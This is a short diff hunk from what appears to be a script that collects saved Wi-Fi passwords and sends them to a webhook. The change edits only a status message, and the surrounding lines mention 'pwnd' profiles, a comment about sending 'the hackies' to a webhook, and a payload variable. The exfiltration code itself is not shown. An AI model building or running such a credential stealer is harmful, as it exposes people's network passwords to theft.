@@ -39,7 +39,7 @@ if len(pwnd) == 0:
     print("No Wi-Fi profiles found. Exiting...")
     sys.exit()
 
-print("Wi-Fi profiles found. Check your webhook...")
+print("Wi-Fi Password found. Check your webhook...")
 
 #Send the hackies to your webhookz
 final_payload = ""
